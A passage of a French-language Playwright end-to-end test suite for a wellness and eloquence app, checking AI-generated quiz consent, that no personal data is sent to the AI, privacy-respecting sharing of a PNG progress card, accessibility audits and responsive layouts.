  await pc.getByRole('button', { name: 'Réviser 5 questions' }).click(); await pc.waitForSelector('.qq'); yes((await pc.textContent('main')).includes('Révision'), 'révision non signalée')
  const rev = []; for (let q = 0; q < 5; q++) { rev.push((await pc.locator('.qq').textContent()).trim()); await pc.locator('.opt').first().click(); await pc.getByRole('button', { name: q < 4 ? 'Question suivante' : 'Voir mon score' }).click() }
  for (const t of rev) yes(served.includes(t), 'révision hors banque vue'); const s2 = await stOf(pc); eq(s2.quiz.seen.length, BANK.length); eq(s2.quiz.hist.at(-1).rev, true)
})
await C.ctx.close()

await B.ctx.unroute(/\/api\/ai$/)
const ACA = { ai: [], quiz: [] }
await B.ctx.route(/\/api\/ai$/, route => {
  const rq = route.request(), body = rq.postData() ?? ''; ACA.ai.push({ body, headers: rq.headers() })
  const mode = JSON.parse(body || '{}').mode
  if (mode === 'quiz') return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ data: ACA.quiz, model: 'gemini-simule' }) })
  return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ text: 'Ouvrez par une image forte, développez en trois temps, concluez en une phrase courte.', model: 'gemini-simule' }) })
})
await T('Académie, IA : questions supplémentaires et conseil d’improvisation, requêtes vérifiées (texte exact, aucune donnée personnelle), questions contrôlées et signalées IA', async () => {
  ACA.ai.length = 0; await pb.goto(URL0 + '#/4'); await resetAca(pb)
  await patchOf(pb, () => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.profile = { g: 'F', name: 'Sentinelle', age: 41, h: 170, w: 61.7, t: 60, ws: 71, lv: 'I', sx: 'F' }; localStorage.setItem('believe:v2', JSON.stringify(s)) })
  await aca(pb, '#/13/quiz')
  await pb.getByRole('button', { name: 'Commencer le quiz du jour' }).click(); await pb.waitForSelector('.qq'); const dupText = (await pb.locator('.qq').textContent()).trim()
  await pb.getByRole('button', { name: 'Quitter, reprendre plus tard' }).click()
  ACA.quiz = [
    { q: 'Quelle figure de style consiste à dire le contraire de ce que l’on pense pour se moquer ?', o: ['L’ironie', 'La litote', 'L’ellipse', 'L’hyperbole'], a: 0, e: 'L’ironie fait comprendre le contraire de ce qui est dit, souvent pour se moquer.' },
    { q: 'Comment appelle-t-on l’art de bien parler et de persuader ?', o: ['La rhétorique', 'La grammaire', 'La syntaxe', 'La phonétique'], a: 0, e: 'La rhétorique est l’art de persuader par la parole.' },
    { q: dupText, o: ['A1', 'B1', 'C1', 'D1'], a: 1, e: 'Question déjà servie, donc refusée comme doublon.' },
    { q: 'Question à trois réponses seulement, donc invalide ?', o: ['A', 'B', 'C'], a: 0, e: 'Invalide : il manque une réponse.' }
  ]
  for (const f of ACA.quiz.slice(0, 2)) yes(!BANK.some(b => b.q === f.q), 'question d’essai déjà dans la banque : ' + f.q)
  await pb.getByLabel('Thème des questions').selectOption('Rhétorique')
  const shown = await pb.getByLabel('Texte exact qui sera envoyé').textContent(); yes(shown.includes('« Rhétorique »'), shown)
  eq(ACA.ai.length, 0, 'envoi avant accord'); eq(await pb.getByRole('button', { name: 'Générer 6 questions' }).count(), 0, 'envoi possible sans accord')
  await pb.getByRole('button', { name: 'Donner mon accord pour l’IA' }).click(); await wait(300); eq(ACA.ai.length, 0, 'envoi dès l’accord')
  await pb.getByRole('button', { name: 'Générer 6 questions' }).click(); await pb.waitForSelector('text=2 nouvelles questions ajoutées'); eq(ACA.ai.length, 1)
  eq(JSON.parse(ACA.ai[0].body), { mode: 'quiz', messages: [{ role: 'user', content: shown }] }); for (const secret of ['Sentinelle', '61.7', '"age"', 'profile', 'consents']) yes(!ACA.ai[0].body.includes(secret), 'donnée personnelle : ' + secret)
  const msg = await pb.textContent('main'); yes(msg.includes('1 question refusée (forme invalide)') && msg.includes('1 doublon écarté'), msg.slice(0, 400))
  const s = await stOf(pb); eq(s.quiz.gen.length, 2); eq(s.quiz.gen.every(g => g.id.startsWith('g') && g.c === 'Rhétorique'), true)
  // elles sont servies comme les autres, signalées IA ; le conseil d’improvisation suit la même règle
  await patchOf(pb, () => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.quiz.cur = null; s.quiz.seen = s.quiz.seen.concat(['xx']); localStorage.setItem('believe:v2', JSON.stringify(s)) })
  await aca(pb, '#/13/impro'); await pb.getByRole('button', { name: 'Obtenir un sujet' }).click(); await pb.getByRole('button', { name: 'Conseil Believe AI' }).click()
  const adv = await pb.getByLabel('Texte exact qui sera envoyé').textContent(); yes(adv.startsWith('Je m’entraîne à improviser à voix haute. Sujet : '), adv); eq(ACA.ai.length, 1, 'envoi à l’ouverture du panneau')
  await pb.getByRole('button', { name: 'Envoyer ce sujet à l’IA' }).click(); await pb.waitForSelector('text=Généré par IA'); eq(ACA.ai.length, 2)
  eq(JSON.parse(ACA.ai[1].body), { mode: 'eloquence', messages: [{ role: 'user', content: adv }], context: '' }); yes(!ACA.ai[1].body.includes('Sentinelle'), 'prénom envoyé')
  yes((await pb.textContent('main')).includes('Ouvrez par une image forte'), 'conseil non affiché'); await pb.reload(); eq(await pb.getByText('Généré par IA').count(), 0, 'conseil conservé')
  eq(JSON.stringify(await stOf(pb)).includes('Ouvrez par une image forte'), false, 'conseil enregistré')
})

await T('Balayage tactile réel entre Exercices, Quiz et Improvisation (rangée d’onglets visible en alternative, haptique non requis)', async () => {
  await aca(pa, '#/13/exo'); const sel = () => pa.evaluate(() => [...document.querySelectorAll('[role=group][aria-label="Section"] .chip[aria-pressed=true]')].map(b => b.textContent))
  const { y, w } = await swipeArea(pa, 'main h2'); eq(await sel(), ['Exercices'])
  await swipe(pa, w - 40, y, 40, y); await pa.waitForSelector('h2:has-text("Quiz du jour")'); eq(await sel(), ['Quiz'])
  const y2 = (await swipeArea(pa, 'main h2')).y; await swipe(pa, w - 40, y2, 40, y2); await pa.waitForSelector('h2:has-text("Improvisation infinie")'); eq(await sel(), ['Improvisation'])
  const y3 = (await swipeArea(pa, 'main h2')).y; await swipe(pa, w - 40, y3, 40, y3); await wait(300); eq(await sel(), ['Improvisation'], 'balayage au-delà de la dernière section')
  await swipe(pa, 40, y3, w - 40, y3); await pa.waitForSelector('h2:has-text("Quiz du jour")'); eq(await sel(), ['Quiz'])
  await pa.getByRole('button', { name: 'Exercices', exact: true }).click(); await pa.waitForSelector(EXO_CARD)
})

for (const theme of ['light', 'dark', 'oled']) {
  await T('Accessibilité (axe-core, WCAG 2.1 AA, contrastes) : rubrique 13 (exercices, fenêtre d’exercice, quiz question/juste/faux/score, improvisation, conseil IA), thème ' + theme, async () => {
    await pb.goto(URL0 + '#/4'); await resetAca(pb)
    await patchOf(pb, t => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.settings.theme = t; localStorage.setItem('believe:v2', JSON.stringify(s)) }, theme)
    await aca(pb, '#/13/exo'); await pb.waitForSelector(EXO_CARD); await axe(pb, 'exercices/' + theme)
    await pb.locator(EXO_CARD).first().getByRole('button', { name: /^Ouvrir/ }).click(); await pb.getByRole('dialog').waitFor(); await wait(300); await axe(pb, 'exercice-ouvert-sans-accord-micro/' + theme)
    await pb.getByRole('button', { name: 'J’accepte' }).click(); await pb.getByRole('button', { name: 'Démarrer le chrono' }).click(); await wait(600); await axe(pb, 'exercice-chrono-en-cours/' + theme)
    if (theme === 'dark') await shot(pb, 'academie-exercice-sombre')
    await pb.keyboard.press('Escape')
    await aca(pb, '#/13/quiz'); await axe(pb, 'quiz-accueil/' + theme)
    await pb.getByRole('button', { name: 'Commencer le quiz du jour' }).click(); await pb.waitForSelector('.qq'); await axe(pb, 'quiz-question/' + theme)
    await answerBank(pb, true); await axe(pb, 'quiz-reponse-juste/' + theme)
    await pb.getByRole('button', { name: 'Question suivante' }).click(); await answerBank(pb, false); await axe(pb, 'quiz-reponse-fausse/' + theme)
    if (theme === 'dark') await shot(pb, 'academie-quiz-faux-sombre'); if (theme === 'light') await shot(pb, 'academie-quiz-faux-clair')
    for (let q = 2; q < 5; q++) { await pb.getByRole('button', { name: 'Question suivante' }).click(); await answerBank(pb, q % 2 === 0) }
    await pb.getByRole('button', { name: 'Voir mon score' }).click(); await pb.waitForSelector('.score'); await axe(pb, 'quiz-score/' + theme)
    await aca(pb, '#/13/impro'); await pb.getByRole('button', { name: 'Obtenir un sujet' }).click(); await pb.getByRole('region', { name: 'Sujet d’improvisation' }).waitFor(); await axe(pb, 'improvisation/' + theme)
    await pb.getByRole('button', { name: 'Conseil Believe AI' }).click(); await axe(pb, 'conseil-ia-avant-envoi/' + theme)
    await patchOf(pb, () => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.consents.ai = true; localStorage.setItem('believe:v2', JSON.stringify(s)) }); await pb.reload(); await pb.getByRole('region', { name: 'Sujet d’improvisation' }).waitFor()
    await pb.getByRole('button', { name: 'Conseil Believe AI' }).click(); await pb.getByRole('button', { name: 'Envoyer ce sujet à l’IA' }).click(); await pb.waitForSelector('text=Généré par IA'); await axe(pb, 'conseil-ia-recu/' + theme)
    if (theme === 'light') await shot(pb, 'academie-improvisation-clair')
  })
}

// =====================================================================================================================
// Rubrique 5 : partage avec des amis, bilan hebdomadaire, badges. Contexte E : vrai Chromium mobile, vrai canevas (PNG décodé par le navigateur),
// menu de partage SIMULÉ qui relit le fichier reçu (Chromium sous Linux n'a pas de menu de partage), texte réellement dessiné enregistré.
// =====================================================================================================================
const E = await mk({ serviceWorkers: 'block', permissions: ['clipboard-read', 'clipboard-write'] }), pe = E.page
await E.ctx.addInitScript(() => {
  window.__painted = []
  const ft = CanvasRenderingContext2D.prototype.fillText
  CanvasRenderingContext2D.prototype.fillText = function (t, ...r) { window.__painted.push(String(t)); return ft.call(this, t, ...r) }
  window.__shared = null
  Object.defineProperty(navigator, 'canShare', { value: d => !!(d && d.files && d.files.length), configurable: true })
  Object.defineProperty(navigator, 'share', {
    configurable: true,
    value: async d => {
      const f = d.files && d.files[0]; let head = null, w = 0, h = 0
      if (f) { const b = new Uint8Array(await f.arrayBuffer()), v = new DataView(b.buffer); head = Array.from(b.slice(0, 8)); w = v.getUint32(16); h = v.getUint32(20) }
      window.__shared = { title: d.title, text: d.text, nfiles: d.files ? d.files.length : 0, name: f ? f.name : null, type: f ? f.type : null, size: f ? f.size : 0, head, w, h }
    }
  })
})
const reqE = []; E.ctx.on('request', r => reqE.push(r.url()))
/** Un état rempli de données personnelles reconnaissables : si l'une d'elles sort alors que sa case est décochée, le test le voit. */
const SHARE_SEED = () => {
  const p2 = n => String(n).padStart(2, '0'), iso = x => x.getFullYear() + '-' + p2(x.getMonth() + 1) + '-' + p2(x.getDate())
  const day = n => { const x = new Date(); x.setDate(x.getDate() + n); return iso(x) }
  const s = JSON.parse(localStorage.getItem('believe:v2')), stamp = new Date().toISOString()
  s.ui = { onboard: true, verseDay: day(0) }; s.consents.share = true; s.share = { vis: {} }; s.settings.theme = 'light'
  s.profile = { g: 'F', name: 'Ada', age: 37, h: 171, w: 66.6, t: 59.4, ws: 73.3, lv: 'I', sx: 'F' }
  s.habits[0].n = 'Prière du matin'
  s.checks = { [day(0)]: ['h1', 'h2'], [day(-1)]: ['h1'], [day(-2)]: ['h1'] }
  s.steps = { [day(-1)]: 12000 }
  s.workouts = [{ d: day(-1), act: 'Course', km: 7.5, sec: 2400, kcal: 500, gain: 20 }]
  s.weights = [{ d: day(-9), kg: 68 }, { d: day(-1), kg: 66.6 }]
  s.meals = [{ id: 'm1', d: day(0), n: 'Soupe du soir', kcal: 321, p: 1, g: 1, l: 1, src: 'manuel' }]
  s.prayers = [{ id: 'p1', t: 'Retrouver la paix intérieure', c: day(0), a: null }, { id: 'g1', t: 'Merci pour mes enfants en bonne santé', c: day(0), a: null, k: 'g' }]
  s.notes = [{ id: 'n1', cat: 'Rêves', t: 'Le fleuve secret', b: 'Texte intime du rêve', c: stamp, u: stamp }]
  s.cycle = { mode: 'recup', starts: [], rec: { [day(0)]: [4, 3, 5] } }
  const bk = (id, t, st) => ({ id, t, a: 'Pascal', src: 'perso', ref: '', cover: null, url: null, total: 200, page: 0, st })
  s.books = [bk('b1', 'Les Pensées', 'cours'), bk('b2', 'Titre déjà terminé', 'fini'), bk('b3', 'Titre à lire plus tard', 'lire')]
  s.quiz.hist = [{ d: day(-1), n: 5, ok: 4, cats: [] }]
  localStorage.setItem('believe:v2', JSON.stringify(s))
}
const HID = { weight: ['73,3', '66,6', '59,4'], food: ['Soupe du soir', '321 kcal'], prayers: ['Retrouver la paix intérieure'], notes: ['Rêves : 1'], cycle: ['Récupération 4 sur 5'], never: ['Merci pour mes enfants en bonne santé', 'Prière du matin', 'Le fleuve secret', 'Texte intime du rêve', 'Titre déjà terminé', 'Titre à lire plus tard', '68 kg'] }
const ALLHID = Object.values(HID).flat()
/** Case du sélecteur par son nom exact (le groupe de confirmation « Confirmer : … » contient le même texte). */
const item = (p, t) => p.getByLabel(t, { exact: true })
const VUE = '[role=region][aria-label="Vue Ami : aperçu exact"]'
const vueLines = p => p.locator(VUE + ' li').allTextContents()
const imgReady = p => p.waitForFunction(() => { const i = document.querySelector('img.cardimg'); return !!i && i.complete && i.naturalWidth > 0 })
const sharePage = async p => { await p.goto(URL0 + '#/5/partage'); await p.waitForSelector(VUE) }
const painted = p => p.evaluate(() => window.__painted)
const resetShare = (p, theme = 'light') => viaStatic(p, t => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.share = { vis: {} }; s.consents.share = true; s.settings.theme = t; localStorage.setItem('believe:v2', JSON.stringify(s)) }, theme)
const lsE = p => p.evaluate(() => JSON.parse(localStorage.getItem('believe:v2')))
await pe.goto(URL0 + '#/4'); await pe.waitForSelector('h1'); await viaStatic(pe, SHARE_SEED)

await T('Partage (Chromium réel) : tout est masqué par défaut (douze cases décochées, aucun texte dessiné, boutons inactifs) ; sans accord, l’accord est demandé et aucune case n’existe', async () => {
  await sharePage(pe)
  eq(await pe.locator('input[type=checkbox]').count(), 12); eq(await pe.locator('input[type=checkbox]:checked').count(), 0)
  for (const n of ['Partager la carte', 'Télécharger l’image', 'Copier le texte']) yes(await pe.getByRole('button', { name: n }).isDisabled(), n + ' actif alors que rien n’est coché')
  eq((await painted(pe)).length, 0, 'du texte a été dessiné avant tout choix'); eq(await pe.locator('img.cardimg').count(), 0)
  yes(!(await pe.textContent('body')).includes('Ada'), 'le prénom est visible sans choix'); yes(/Masqué pour vos amis \(12\)/.test(await pe.textContent('body')))
  await shot(pe, 'partage-tout-masque')
  await viaStatic(pe, () => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.consents.share = false; localStorage.setItem('believe:v2', JSON.stringify(s)) })
  await pe.goto(URL0 + '#/5/partage'); await pe.waitForSelector('text=Believe n’envoie rien lui-même')
  eq(await pe.locator('input[type=checkbox]').count(), 0); eq(await pe.locator(VUE).count(), 0); eq(await pe.getByRole('button', { name: 'J’accepte' }).count(), 1)
  await viaStatic(pe, SHARE_SEED)
})

await T('Partage (Chromium réel) : l’image PNG est réellement dessinée et décodée (1080 px, couleurs attendues) ; le menu de partage reçoit ce fichier et le texte de l’aperçu, sans aucune donnée masquée', async () => {
  await sharePage(pe)
  for (const l of ['Mon prénom', 'Mes habitudes', 'Mes lectures en cours', 'Mes badges']) await item(pe, l).check()
  await imgReady(pe)
  const dim = await pe.evaluate(() => { const i = document.querySelector('img.cardimg'); return [i.naturalWidth, i.naturalHeight] })
  eq(dim[0], 1080); yes(dim[1] >= 720 && dim[1] < 3000, 'hauteur ' + dim[1])
  const px = await pe.evaluate(() => { // pixels de l'image décodée : en-tête indigo, bandeau doré, fond clair
    const i = document.querySelector('img.cardimg'), c = document.createElement('canvas'); c.width = i.naturalWidth; c.height = i.naturalHeight
    const x = c.getContext('2d'); x.drawImage(i, 0, 0); const g = (a, b) => Array.from(x.getImageData(a, b, 1, 1).data).slice(0, 3)
    return { head: g(900, 20), gold: g(540, 303), body: g(1070, 600) }
  })
  yes(px.head[2] > 100 && px.head[0] < 90, 'en-tête ' + px.head); yes(px.gold[0] > 190 && px.gold[2] < 140, 'bandeau ' + px.gold); yes(px.body.every(v => v > 235), 'fond ' + px.body)
  await pe.getByRole('button', { name: 'Partager la carte' }).click(); await pe.waitForSelector('text=Le menu de partage s’est fermé')
  const sh = await pe.evaluate(() => window.__shared)
  eq([sh.name, sh.type, sh.nfiles, sh.head, sh.w, sh.h, sh.title], ['believe-suivi.png', 'image/png', 1, [137, 80, 78, 71, 13, 10, 26, 10], 1080, dim[1], 'Suivi de Ada'])
  yes(sh.size > 8000, 'image presque vide : ' + sh.size + ' octets')
  const ls = await vueLines(pe); yes(ls.length >= 6, 'aperçu trop court : ' + JSON.stringify(ls))
  for (const l of ls) yes(sh.text.includes('– ' + l), 'ligne de l’aperçu absente du texte partagé : ' + l)
  eq((sh.text.match(/^– /gm) || []).length, ls.length, 'le texte n’a pas les mêmes lignes que l’aperçu')
  const drawn = (await painted(pe)).join('\n')
  for (const x of ALLHID) { yes(!sh.text.includes(x), 'texte partagé : ' + x); yes(!drawn.includes(x), 'image dessinée : ' + x); yes(!(await pe.textContent(VUE)).includes(x), 'aperçu : ' + x) }
  yes(drawn.includes('Suivi de Ada') && drawn.includes('Les Pensées'), 'le texte choisi n’est pas dessiné')
  for (const l of ls) yes(drawn.replace(/\s+/g, ' ').includes(l.split(' ').slice(0, 2).join(' ')), 'ligne non dessinée : ' + l)
  await shot(pe, 'partage-apercu-image')
})

await T('Partage (Chromium réel) : un élément sensible reste hors de l’aperçu et de l’image avant « Oui », y entre après, et en sort dès qu’on décoche', async () => {
  await resetShare(pe); await sharePage(pe); await pe.evaluate(() => { window.__painted.length = 0 })
  const w = item(pe, 'Mon poids (départ, actuel, objectif)')
  await w.click(); eq(await w.isChecked(), false); await pe.getByRole('group', { name: 'Confirmer : Mon poids (départ, actuel, objectif)' }).waitFor()
  yes(!(await pe.textContent(VUE)).includes('73,3'), 'poids visible avant confirmation'); eq((await painted(pe)).length, 0); eq((await lsE(pe)).share.vis, {})
  await shot(pe, 'partage-confirmation-sensible')
  await pe.getByRole('button', { name: 'Non, la garder masquée' }).click(); eq(await w.isChecked(), false); eq(await pe.getByRole('group', { name: /^Confirmer/ }).count(), 0)
  await w.click(); await pe.getByRole('button', { name: 'Oui, la montrer à mes amis' }).click(); eq(await w.isChecked(), true)
  yes((await pe.textContent(VUE)).includes('Départ 73,3 kg · actuel 66,6 kg · objectif 59,4 kg')); await imgReady(pe); yes((await painted(pe)).join('\n').includes('73,3'), 'poids non dessiné après confirmation')
  eq((await lsE(pe)).share.vis, { weight: true })
  await w.uncheck(); await pe.waitForFunction(() => !document.querySelector('img.cardimg'))
  yes(!(await pe.textContent(VUE)).includes('73,3'), 'poids encore visible après avoir décoché'); eq((await lsE(pe)).share.vis, {})
  await pe.evaluate(() => { window.__painted.length = 0 }); await wait(300); eq((await painted(pe)).length, 0, 'du texte est dessiné alors que plus rien n’est visible')
})

await T('Partage (Chromium réel) : chaque catégorie sensible cochée seule ne fait sortir que ses propres lignes (aperçu, texte et image)', async () => {
  const MAP = { weight: 'Mon poids (départ, actuel, objectif)', weightPct: 'Ma progression vers mon objectif de poids', cycle: 'Mon suivi cycle ou récupération', food: 'Mes calories et repas du jour', prayers: 'Mes sujets de prière', notes: 'Mes notes' }
  const OWN = { weight: HID.weight, weightPct: ['% du chemin parcouru'], cycle: HID.cycle, food: HID.food, prayers: HID.prayers, notes: HID.notes }
  for (const [k, label] of Object.entries(MAP)) {
    await resetShare(pe); await sharePage(pe); await pe.evaluate(() => { window.__painted.length = 0; window.__shared = null })
    await item(pe, label).click(); await pe.getByRole('button', { name: 'Oui, la montrer à mes amis' }).click(); await imgReady(pe)
    const v = await pe.textContent(VUE), d = (await painted(pe)).join('\n')
    for (const x of OWN[k]) { yes(v.includes(x), k + ' : « ' + x + ' » absent de l’aperçu'); yes(d.includes(x), k + ' : « ' + x + ' » non dessiné') }
    for (const [k2, list] of Object.entries(OWN)) if (k2 !== k) for (const x of list) { yes(!v.includes(x), k + ' montre ' + k2 + ' dans l’aperçu : ' + x); yes(!d.includes(x), k + ' dessine ' + k2 + ' : ' + x) }
    for (const x of HID.never) { yes(!v.includes(x), 'donnée interdite dans l’aperçu : ' + x); yes(!d.includes(x), 'donnée interdite dessinée : ' + x) }
    await pe.getByRole('button', { name: 'Partager la carte' }).click(); await pe.waitForSelector('text=Le menu de partage s’est fermé'); const sh = await pe.evaluate(() => window.__shared)
    for (const [k2, list] of Object.entries(OWN)) if (k2 !== k) for (const x of list) yes(!sh.text.includes(x), k + ' : texte partagé avec ' + k2 + ' : ' + x)
    for (const x of HID.never) yes(!sh.text.includes(x), 'donnée interdite dans le texte : ' + x)
  }
})

await T('Partage (Chromium réel) : « Télécharger l’image » donne un vrai fichier PNG de 1080 px ; « Copier le texte » place dans le presse-papiers exactement le texte remis au menu de partage', async () => {
  await resetShare(pe); await sharePage(pe)
  await item(pe, 'Mon prénom').check(); await item(pe, 'Mes habitudes').check(); await imgReady(pe)
  const [dl] = await Promise.all([pe.waitForEvent('download'), pe.getByRole('button', { name: 'Télécharger l’image' }).click()])
  eq(dl.suggestedFilename(), 'believe-suivi.png'); await dl.saveAs(join(SHOTS, 'carte-partage.png')); const buf = readFileSync(await dl.path())
  eq([...buf.subarray(0, 8)], [137, 80, 78, 71, 13, 10, 26, 10]); eq(buf.readUInt32BE(16), 1080); yes(buf.length > 8000, 'fichier presque vide : ' + buf.length)
  yes(await pe.getByText(/Téléchargement de l’image lancé/).count() === 1)
  await pe.getByRole('button', { name: 'Copier le texte' }).click(); await pe.waitForSelector('text=Texte copié dans le presse-papiers.')
  const clip = await pe.evaluate(() => navigator.clipboard.readText())
  await pe.getByRole('button', { name: 'Partager la carte' }).click(); await pe.waitForSelector('text=Le menu de partage s’est fermé'); const sh = await pe.evaluate(() => window.__shared)
  eq(clip, sh.text); yes(clip.startsWith('Suivi de Ada · '), clip.slice(0, 40)); yes(clip.includes('– Réussite : '))
})

await T('Partage (Chromium réel) : les choix survivent au rechargement ; la révocation (avec annulation possible) retire l’accord, masque tout et supprime les boutons ; un nouvel accord ne rend rien visible', async () => {
  await resetShare(pe); await sharePage(pe)
  await item(pe, 'Mon prénom').check(); await item(pe, 'Mes calories et repas du jour').click(); await pe.getByRole('button', { name: 'Oui, la montrer à mes amis' }).click()
  eq((await lsE(pe)).share.vis, { name: true, food: true }); await pe.reload(); await pe.waitForSelector(VUE)
  eq(await item(pe, 'Mon prénom').isChecked(), true); eq(await item(pe, 'Mes calories et repas du jour').isChecked(), true); eq(await item(pe, 'Mon poids (départ, actuel, objectif)').isChecked(), false)
  eq(await vueLines(pe), ['321 kcal', 'Soupe du soir'])
  await pe.getByRole('button', { name: 'Révoquer le partage' }).click(); await pe.getByRole('button', { name: 'Annuler' }).click(); eq((await lsE(pe)).consents.share, true)
  await pe.getByRole('button', { name: 'Révoquer le partage' }).click(); await pe.getByRole('button', { name: 'Confirmer la révocation' }).click(); await pe.waitForSelector('text=Partage révoqué')
  const s = await lsE(pe); eq([s.consents.share, s.share.vis], [false, {}]); eq(await pe.locator('input[type=checkbox]').count(), 0); eq(await pe.getByRole('button', { name: 'Partager la carte' }).count(), 0)
  await pe.reload(); await pe.waitForSelector('text=Believe n’envoie rien lui-même'); eq(await pe.getByRole('button', { name: 'Partager la carte' }).count(), 0)
  await pe.getByRole('button', { name: 'J’accepte' }).click(); await pe.waitForSelector(VUE); eq(await pe.locator('input[type=checkbox]:checked').count(), 0); eq((await lsE(pe)).share.vis, {})
})

await T('Bilan (Chromium réel) : onglet par défaut de la rubrique 5, douze badges avec critère, lien vers le partage ; balayage tactile réel entre Bilan, Partage et Confidentialité (rangée d’onglets visible en alternative)', async () => {
  await resetShare(pe); await pe.goto(URL0 + '#/5'); await pe.waitForSelector('h2:has-text("Bilan de la semaine")')
  const sel = () => pe.evaluate(() => [...document.querySelectorAll('[role=group][aria-label="Section"] .chip[aria-pressed=true]')].map(b => b.textContent))
  eq(await sel(), ['Bilan']); yes(/\d+ % de réussite des habitudes/.test(await pe.textContent('main'))); eq(await pe.locator('ul[aria-label="Badges"] li').count(), 12)
  yes(await pe.locator('ul[aria-label="Badges"] li.got').count() >= 3, 'badges attendus non obtenus'); yes(/Habitude la plus régulière cette semaine : « Prière du matin »/.test(await pe.textContent('main')) || new Date().getDay() === 1, 'habitude la plus régulière')
  const lab = await pe.locator('[role=img][aria-label^="Part d’habitudes validées par jour"]').getAttribute('aria-label'); yes(/Lun .*Dim /.test(lab), lab)
  const { y, w } = await swipeArea(pe, 'main h2')
  await swipe(pe, w - 40, y, 40, y); await pe.waitForSelector('h2:has-text("Partager mon suivi avec des amis")'); eq(await sel(), ['Partage'])
  const y2 = (await swipeArea(pe, 'main h2')).y; await swipe(pe, w - 40, y2, 40, y2); await wait(400); eq(await sel(), ['Confidentialité'])
  const y3 = (await swipeArea(pe, 'main h2')).y; await swipe(pe, 40, y3, w - 40, y3); await wait(400); eq(await sel(), ['Partage'])
  await pe.getByRole('button', { name: 'Bilan', exact: true }).click(); await pe.getByRole('link', { name: 'Choisir ce que mes amis voient' }).click(); await pe.waitForSelector(VUE); yes(pe.url().endsWith('#/5/partage'), pe.url())
})

for (const theme of ['light', 'dark', 'oled']) {
  await T('Accessibilité (axe-core, WCAG 2.1 AA, contrastes) : rubrique 5 (bilan, badges, partage vide, confirmation sensible, aperçu avec image, révocation), thème ' + theme, async () => {
    await resetShare(pe, theme); await pe.goto(URL0 + '#/5'); await pe.waitForSelector('h2:has-text("Bilan de la semaine")'); await wait(200); await axe(pe, 'bilan/' + theme)
    eq(await pe.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth), true, 'débordement horizontal (bilan)')
    if (theme !== 'oled') await shot(pe, 'bilan-' + theme)
    await sharePage(pe); await axe(pe, 'partage-vide/' + theme)
    await item(pe, 'Mon poids (départ, actuel, objectif)').click(); await pe.getByRole('group', { name: /^Confirmer/ }).waitFor(); await axe(pe, 'partage-confirmation/' + theme)
    if (theme === 'dark') await shot(pe, 'partage-confirmation-sombre')
    await pe.getByRole('button', { name: 'Oui, la montrer à mes amis' }).click()
    for (const l of ['Mon prénom', 'Mes habitudes', 'Mes badges', 'Mes lectures en cours', 'Mes scores de quiz']) await item(pe, l).check()
    await imgReady(pe); await wait(200); await axe(pe, 'partage-apercu/' + theme)
    eq(await pe.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth), true, 'débordement horizontal (partage)')
    await pe.locator(VUE).scrollIntoViewIfNeeded(); if (theme === 'dark') await shot(pe, 'partage-apercu-sombre'); if (theme === 'light') await shot(pe, 'partage-apercu-clair')
    await pe.getByRole('button', { name: 'Révoquer le partage' }).click(); await axe(pe, 'partage-revocation/' + theme)
    await pe.getByRole('button', { name: 'Confirmer la révocation' }).click(); await pe.waitForSelector('text=Believe n’envoie rien lui-même'); await axe(pe, 'partage-sans-accord/' + theme)
  })
}

await T('Partage et bilan : aucune requête réseau hors de l’application elle-même (rien n’est envoyé, ni à un serveur Believe ni à un tiers)', async () => {
  const out = reqE.filter(u => !/^(http:\/\/localhost:4173\/|blob:|data:)/.test(u)); eq(out, [], 'requêtes vers l’extérieur')
  eq(reqE.filter(u => /\/api\//.test(u)), [], 'appel à une fonction serveur')
})
await resetShare(pe)
await E.ctx.close()

const D = await mk({ serviceWorkers: 'block', viewport: { width: 1100, height: 800 }, isMobile: false, hasTouch: false }), pd = D.page
await T('Académie sur grand écran (≥ 768 px, barre latérale) : trois sections, accessibilité, aucun débordement horizontal', async () => {
  await pd.goto(URL0 + '#/4'); await pd.waitForSelector('h1'); await pd.evaluate(ONBOARDED)
  for (const [sub, sel] of [['exo', EXO_CARD], ['quiz', 'h2:has-text("Quiz du jour")'], ['impro', 'h2:has-text("Improvisation infinie")']]) {
    await pd.goto(URL0 + '#/13/' + sub); await pd.reload(); await pd.waitForSelector(sel); await wait(300)
    eq(await pd.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth), true, 'débordement horizontal (' + sub + ')'); await axe(pd, 'grand-ecran/' + sub)
  }
  await shot(pd, 'academie-grand-ecran')
})
await T('Rubrique 5 sur grand écran (≥ 768 px, barre latérale) : bilan, partage avec aperçu et image, accessibilité, aucun débordement horizontal', async () => {
  await pd.goto(URL0 + '#/4'); await pd.waitForSelector('h1'); await viaStatic(pd, SHARE_SEED)
  for (const [hash, sel] of [['#/5', 'h2:has-text("Bilan de la semaine")'], ['#/5/partage', VUE]]) {
    await pd.goto(URL0 + hash); await pd.reload(); await pd.waitForSelector(sel); await wait(300)
    eq(await pd.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth), true, 'débordement horizontal (' + hash + ')'); await axe(pd, 'grand-ecran/' + hash)
  }
  for (const l of ['Mon prénom', 'Mes habitudes', 'Mes badges']) await item(pd, l).check()
  await imgReady(pd); await wait(200); await axe(pd, 'grand-ecran/partage-apercu'); eq(await pd.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth), true, 'débordement horizontal (aperçu)')
  await shot(pd, 'partage-grand-ecran')
})
await D.ctx.close()
// ═════════ Rubriques 1, 2 et 4 dans un vrai Chromium : accueil guidé, verset du jour, mur de prières, balayage et vibration ═════════
const VERSES = await (async () => { const out = join(tmpdir(), 'believe-e2e-verses-' + process.pid + '.mjs'); await build({ entryPoints: [join(process.cwd(), 'src/verses.ts')], bundle: true, format: 'esm', platform: 'node', outfile: out, logLevel: 'silent' }); return import(pathToFileURL(out).href) })()
const spies = () => { // espions posés avant le chargement : vibrations demandées et textes lus à voix haute (rien n'est réellement prononcé)
  window.__vib = []; Object.defineProperty(navigator, 'vibrate', { configurable: true, value: p => { window.__vib.push(p); return true } })
  window.__said = []; const ss = window.speechSynthesis
  if (ss) { ss.speak = u => { window.__said.push({ text: u.text, lang: u.lang }) }; ss.cancel = () => undefined }
}
